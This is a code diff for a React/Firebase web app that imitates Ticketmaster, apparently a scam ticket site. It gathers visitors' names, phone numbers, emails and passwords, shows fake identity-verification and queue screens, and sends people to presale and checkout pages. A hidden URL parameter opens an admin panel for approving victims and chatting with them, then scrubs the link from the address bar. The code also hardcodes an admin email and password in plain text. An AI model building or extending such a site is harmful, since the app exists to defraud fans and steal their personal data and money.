@@ -26,68 +26,6 @@ const appId = import.meta.env.VITE_APP_ID || 'default-app-id';
 const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
 const ADMIN_PASS = "Ifeoluwapo@1!";
 
-// --- TRANSLATIONS ---
-const t = {
-  EN: {
-    heroTitle: "The World's Biggest Stage.",
-    verified: "Verified Only",
-    join: "Join Queue",
-    verifyTitle: "Create Account",
-    verifySub: "Verify Identity to Enter",
-    loginTitle: "Welcome Back",
-    loginSub: "Log in to check your status",
-    email: "Email Address",
-    name: "Full Name",
-    phone: "Mobile Number",
-    dob: "Date of Birth",
-    pass: "Password",
-    agree: "I agree to Terms & Anti-Bot Policy",
-    btnJoin: "Verify & Join",
-    btnLogin: "Log In",
-    haveAcc: "Already have an account?",
-    noAcc: "Need an account?",
-    holdTitle: "Verifying Identity...",
-    holdSub: "Please hold while the Host reviews your request.",
-    deniedTitle: "ACCESS DENIED",
-    deniedSub: "Your identity could not be verified by the host.",
-    queueTitle: "Fans Ahead of You",
-    queueEst: "Estimated Wait: Less than a minute",
-    unlock: "Unlock",
-    presaleTitle: "Early Access",
-    presaleSub: "Enter your Code to unlock seats",
-    chatSupport: "Chat with Support"
-  },
-  ES: {
-    heroTitle: "El Escenario Más Grande.",
-    verified: "Solo Verificados",
-    join: "Unirse a la Cola",
-    verifyTitle: "Crear Cuenta",
-    verifySub: "Verifica identidad para entrar",
-    loginTitle: "Bienvenido de nuevo",
-    loginSub: "Inicia sesión para acceder",
-    email: "Correo Electrónico",
-    name: "Nombre Completo",
-    phone: "Número de Móvil",
-    dob: "Fecha de Nacimiento",
-    pass: "Contraseña",
-    agree: "Acepto los Términos y Política Anti-Bot",
-    btnJoin: "Verificar y Unirse",
-    btnLogin: "Iniciar Sesión",
-    haveAcc: "¿Ya tienes cuenta?",
-    noAcc: "¿Necesitas una cuenta?",
-    holdTitle: "Verificando Identidad...",
-    holdSub: "Por favor espere mientras el Anfitrión revisa su solicitud.",
-    deniedTitle: "ACCESO DENEGADO",
-    deniedSub: "Su identidad no pudo ser verificada.",
-    queueTitle: "Fans Delante de Ti",
-    queueEst: "Espera estimada: Menos de un minuto",
-    unlock: "Desbloquear",
-    presaleTitle: "Acceso Anticipado",
-    presaleSub: "Introduce tu código",
-    chatSupport: "Chatear con Soporte"
-  }
-};
-
 const INITIAL_EVENTS = [
   { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
   { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
@@ -129,8 +67,6 @@ export default function App() {
   const [activeNotification, setActiveNotification] = useState(null);
   const [adminUserInp, setAdminUserInp] = useState('');
   const [adminPassInp, setAdminPassInp] = useState('');
-  
-  // Admin Data
   const [adminTab, setAdminTab] = useState('requests'); 
   const [allSessions, setAllSessions] = useState([]);
 
@@ -140,7 +76,6 @@ export default function App() {
     if (p.get('messenger') === '123' || p.get('messenger') === 'true') {
       setIsAdminLoggedIn(true);
       setCurrentPage('admin');
-      // Clean URL (Invisible Link)
       window.history.replaceState({}, document.title, "/");
     }
   }, []);
@@ -152,7 +87,7 @@ export default function App() {
             await signInAnonymously(auth);
         } else {
             setUser(u);
-            if (!u.isAnonymous && (currentPage === 'auth' || currentPage === 'home')) {
+            if (!u.isAnonymous && currentPage === 'auth') {
                 await findOrCreateSession(u);
             }
         }
@@ -181,13 +116,18 @@ export default function App() {
       
       if (defaultStatus) await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { status: defaultStatus });
 
-      // Immediate Status Check (Unblocks Login)
       const snap = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid));
       if (snap.exists()) {
           const d = snap.data();
-          if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('queue'); 
-          else if (d.status === 'waiting_approval' && currentPage === 'auth') setCurrentPage('waiting_room');
+          if (d.accessGranted === 'denied') {
+              setCurrentPage('denied');
+          } else if (d.accessGranted === 'allowed') {
+              // APPROVED: Route based on Event Type
+              if (selectedEvent?.status === 'presale') setCurrentPage('presale');
+              else setCurrentPage('queue');
+          } else if (d.status === 'waiting_approval') {
+              setCurrentPage('waiting_room');
+          }
       }
   };
 
@@ -197,14 +137,27 @@ export default function App() {
     return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
       if(snap.exists()) {
         const d = snap.data();
+        setSessionData(d);
         setChatMessages(d.chatHistory || []);
         if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
         
         if (d.accessGranted === 'denied') setCurrentPage('denied');
-        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
+        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') {
+             // AUTO-MOVE when Approved
+             if (selectedEvent?.status === 'presale') setCurrentPage('presale');
+             else setCurrentPage('queue');
+        }
       }
     });
-  }, [currentSessionId, currentPage]);
+  }, [currentSessionId, currentPage, selectedEvent]);
+
+  // --- ADMIN LISTENER ---
+  useEffect(() => {
+    if (!isAdminLoggedIn) return;
+    return onSnapshot(query(collection(db, 'artifacts', appId, 'public', 'data', 'sessions'), orderBy('createdAt', 'desc')), (snap) => {
+        setAllSessions(snap.docs.map(d => ({id: d.id, ...d.data()})));
+    });
+  }, [isAdminLoggedIn]);
 
   // --- QUEUE LOGIC ---
   useEffect(() => {
@@ -216,7 +169,7 @@ export default function App() {
                   setQueueProgress(((2431 - newPos) / 2431) * 100);
                   if (newPos <= 0) {
                       clearInterval(interval);
-                      setCurrentPage(selectedEvent?.status === 'presale' ? 'presale' : 'seatmap');
+                      setCurrentPage('seatmap');
                       return 0;
                   }
                   return newPos;
@@ -224,7 +177,7 @@ export default function App() {
           }, 1000);
           return () => clearInterval(interval);
       }
-  }, [currentPage, selectedEvent]);
+  }, [currentPage]);
 
   // --- ACTIONS ---
   const handleRealSignup = async () => {
@@ -261,7 +214,7 @@ export default function App() {
   };
 
   const updateSessionStatus = async (sid, status) => {
-      await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { accessGranted: status, status: status === 'allowed' ? 'in_queue' : 'blocked' });
+      await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { accessGranted: status, status: status === 'allowed' ? 'active' : 'blocked' });
   };
 
   const updateSession = (updates) => {
@@ -269,92 +222,57 @@ export default function App() {
   };
 
   const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
-  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸', 'DE': '🇩🇪', 'FR': '🇫🇷' };
-  const txt = t[lang] || t['EN'];
+  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸' };
+  const txt = {
+      EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You" },
+      ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante" }
+  }[lang];
 
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
-      
-      {/* HEADER */}
       {!isAdminLoggedIn && (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
                 {currentPage !== 'home' && <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 active:scale-95 transition-all"><ChevronLeft className="w-5 h-5" /></button>}
-                <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}>
-                    <span className="font-extrabold text-xl tracking-tighter italic">ticketmaster</span>
-                    <CheckCircle className="w-4 h-4 text-[#026cdf] fill-current" />
-                </div>
+                <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}><span className="font-extrabold text-xl tracking-tighter italic">ticketmaster</span><CheckCircle className="w-4 h-4 text-[#026cdf] fill-current" /></div>
             </div>
             <div className="flex items-center gap-4 z-20">
-                {currentPage === 'home' && (
-                    <>
-                        <button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white"><Search className="w-5 h-5" /></button>
-                        <div className="hidden lg:flex relative group">
-                            <input className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black" placeholder="Search..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} />
-                            <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
-                        </div>
-                    </>
-                )}
-                <div className="relative">
-                    <button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all"><span>{flags[lang]}</span><span>{lang}</span></button>
-                    {showLangMenu && <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">{Object.keys(flags).map(l => (<button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>))}</div>}
-                </div>
+                {currentPage === 'home' && (<><button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white"><Search className="w-5 h-5" /></button><div className="hidden lg:flex relative group"><input className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black" placeholder="Search..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /><Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" /></div></>)}
+                <div className="relative"><button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all"><span>{flags[lang]}</span><span>{lang}</span></button>{showLangMenu && <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">{Object.keys(flags).map(l => (<button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>))}</div>}</div>
                 <button onClick={() => setCurrentPage('admin')}><User className="w-5 h-5 text-gray-400 hover:text-white transition-colors" /></button>
             </div>
             {showMobileSearch && currentPage === 'home' && <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10"><input autoFocus className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none" placeholder="Search events..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /></div>}
         </header>
       )}
 
-      {/* CONTENT */}
       <main className={`min-h-screen ${!isAdminLoggedIn ? 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto' : 'bg-[#f1f5f9] text-gray-900'}`}>
-        
-        {/* HOME */}
         {currentPage === 'home' && (
           <div className="space-y-10 animate-fadeIn">
             <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
-              <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" />
-              <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
-              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2">
-                 <div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div>
-                 <h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1>
-              </div>
+              <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
+              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
             </div>
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-              {filteredEvents.map(ev => (
-                <div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl">
-                  <div className="h-56 relative">
-                    <img src={ev.image} className="w-full h-full object-cover" />
-                    <div className="absolute top-4 right-4 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.status}</div>
-                  </div>
-                  <div className="p-6 space-y-4">
-                    <h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3>
-                    <div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div>
-                  </div>
-                </div>
-              ))}
-            </div>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.status}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
           </div>
         )}
 
-        {/* AUTH */}
         {currentPage === 'auth' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
-                 <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter">{authMode === 'signup' ? txt.verifyTitle : txt.loginTitle}</h2><p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{authMode === 'signup' ? txt.verifySub : txt.loginSub}</p></div>
+                 <div className="text-center"><h2 className="text-3xl font-black italic uppercase tracking-tighter">{authMode==='signup'?"Create Account":"Welcome Back"}</h2></div>
                  <div className="space-y-3">
-                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /><input type="date" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none text-gray-500" value={tempUser.dob} onChange={e => setTempUser({...tempUser, dob: e.target.value})} /></>}
-                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
-                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
-                     {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-500">{txt.agree}</p></div>}
+                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Full Name" value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Mobile" value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Email" value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
+                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder="Password" value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
+                     {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-500">I agree to Terms</p></div>}
                  </div>
                  {authError && <p className="text-center text-red-500 font-bold text-xs">{authError}</p>}
                  <button onClick={authMode === 'signup' ? handleRealSignup : handleRealLogin} className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg">{authMode === 'signup' ? txt.btnJoin : txt.btnLogin}</button>
-                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-400 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? txt.haveAcc : txt.noAcc}</button></div>
+                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-400 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? "Have account?" : "Create account"}</button></div>
               </div>
            </div>
         )}
 
-        {/* WAITING ROOM */}
         {currentPage === 'waiting_room' && (
            <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn">
                <div className="w-20 h-20 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" />
@@ -363,7 +281,6 @@ export default function App() {
            </div>
         )}
 
-        {/* DENIED */}
         {currentPage === 'denied' && (
            <div className="min-h-[80vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn bg-red-950/20 rounded-3xl mt-10 border border-red-900/50">
                <AlertOctagon className="w-24 h-24 text-red-500 animate-pulse" />
@@ -372,7 +289,6 @@ export default function App() {
            </div>
         )}
 
-        {/* QUEUE */}
         {currentPage === 'queue' && (
            <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-12 animate-fadeIn">
                <div className="bg-white/5 p-6 rounded-3xl border border-white/10 w-full max-w-lg mb-4">
@@ -390,22 +306,22 @@ export default function App() {
            </div>
         )}
 
-        {/* PRESALE LIST */}
+        {/* PRESALE UI (NO MAP) */}
         {currentPage === 'presale' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
                <div className="bg-[#1f262d] w-full max-w-2xl p-8 lg:p-12 rounded-[40px] shadow-2xl animate-slideUp border-t-8 border-[#ea0042]">
                    {!presaleUnlocked ? (
                        <div className="text-center space-y-8">
                            <ShieldCheck className="w-16 h-16 text-[#ea0042] mx-auto" />
-                           <div><h2 className="text-3xl font-black italic uppercase tracking-tighter">{txt.presaleTitle}</h2><p className="text-xs font-bold text-gray-400 uppercase tracking-widest mt-2">{txt.presaleSub}</p></div>
+                           <div><h2 className="text-3xl font-black italic uppercase tracking-tighter">Early Access On Sale</h2><p className="text-xs font-bold text-gray-400 uppercase tracking-widest mt-2">Enter code to view tickets</p></div>
                            <input className="w-full text-center text-3xl font-black uppercase tracking-[0.5em] border-b-4 border-gray-600 focus:border-[#ea0042] outline-none py-4 bg-transparent" placeholder="CODE" value={presaleInput} onChange={e => setPresaleInput(e.target.value.toUpperCase())} />
-                           <button onClick={() => { if(presaleInput===globalSettings.presaleCode) setPresaleUnlocked(true); else alert("Invalid Code"); }} className="w-full bg-[#ea0042] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-105 transition-all">{txt.unlock}</button>
+                           <button onClick={() => { if(presaleInput===globalSettings.presaleCode) setPresaleUnlocked(true); else alert("Invalid Code"); }} className="w-full bg-[#ea0042] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-105 transition-all">Unlock</button>
                        </div>
                    ) : (
                        <div className="space-y-6">
                            <div className="flex justify-between items-center pb-6 border-b border-white/10"><h2 className="text-2xl font-black italic uppercase">Select Tickets</h2><div className="flex items-center gap-2"><span className="text-[10px] font-bold uppercase text-gray-400">Show Fees</span><div onClick={()=>setShowFees(!showFees)} className={`w-10 h-6 rounded-full p-1 cursor-pointer transition-colors ${showFees?'bg-[#ea0042]':'bg-gray-600'}`}><div className={`w-4 h-4 bg-white rounded-full transition-transform ${showFees?'translate-x-4':''}`} /></div></div></div>
-                           {[{name:'Regular Admission', price:50, color:'bg-blue-600'}, {name:'VIP Package', price:200, color:'bg-purple-600'}, {name:'Platinum Front Row', price:300, color:'bg-gray-200 text-black'}].map((t,i) => (
-                               <div key={i} className="bg-black/20 p-6 rounded-2xl flex justify-between items-center hover:bg-black/40 transition-all cursor-pointer border border-white/5 hover:border-white/20" onClick={()=>{setCart([{id:Date.now(), price: showFees ? t.price*1.15 : t.price}]); setCurrentPage('checkout');}}>
+                           {[{name:'Regular Admission', price:50}, {name:'VIP Package', price:200}, {name:'Platinum Front Row', price:300}].map((t,i) => (
+                               <div key={i} className="bg-black/20 p-6 rounded-2xl flex justify-between items-center hover:bg-black/40 transition-all cursor-pointer border border-white/5 hover:border-white/20" onClick={()=>{setCart([{id:Date.now(), price: showFees ? t.price*1.15 : t.price, name: t.name}]); setCurrentPage('checkout');}}>
                                    <div><h3 className={`font-black uppercase italic ${t.name.includes('Platinum')?'text-white':'text-gray-200'}`}>{t.name}</h3></div>
                                    <div className="text-right"><p className="text-xl font-black">${showFees ? (t.price*1.15).toFixed(0) : t.price}</p><p className="text-[10px] text-gray-500 uppercase">{showFees ? 'Incl. Fees' : '+ Fees'}</p></div>
                                </div>
@@ -416,13 +332,9 @@ export default function App() {
            </div>
         )}
 
-        {/* SEAT MAP */}
         {currentPage === 'seatmap' && <SeatMap event={selectedEvent} globalPrice={globalSettings.price} cart={cart} setCart={setCart} onCheckout={() => setCurrentPage('checkout')} />}
-
-        {/* CHECKOUT */}
         {currentPage === 'checkout' && <Checkout cart={cart} onBack={() => setCurrentPage(selectedEvent?.status==='presale'?'presale':'seatmap')} onSuccess={() => setCurrentPage('success')} />}
 
-        {/* SUCCESS */}
         {currentPage === 'success' && (
           <div className="flex flex-col items-center justify-center min-h-[60vh] text-center space-y-8 animate-fadeIn">
              <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center shadow-[0_0_50px_#22c55e] animate-bounce"><CheckCircle className="w-12 h-12 text-white" /></div>
